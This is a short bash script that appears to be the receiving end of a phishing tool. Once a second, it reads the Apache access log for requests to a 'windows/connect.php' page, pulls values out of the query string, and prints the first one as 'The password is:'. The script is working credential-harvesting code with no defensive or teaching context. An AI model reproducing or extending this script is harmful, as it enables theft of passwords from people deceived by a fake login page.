function getcre(){
mon="$(sudo tail -1 /var/log/apache2/access.log)"

s="$(grep "GET /windows/connect.php?" /var/log/apache2/access.log | tail -1)"
f="$(echo $s | cut -d " " -f 7)"

        QUERY="$(echo $f | cut -d "?" -f2)"
        IFS="&"
        set -- $QUERY
        pass1="$(echo $1 | cut -d "=" -f2)"
        pass2="$(echo $2 | cut -d "=" -f2)"
        printf "\r\t\t\t\t$pass1"

}
echo " "
echo " "
echo "                    The password is:"
#tail -f /var/log/apache2/access.log



while true;do
getcre;
sleep 1s
done
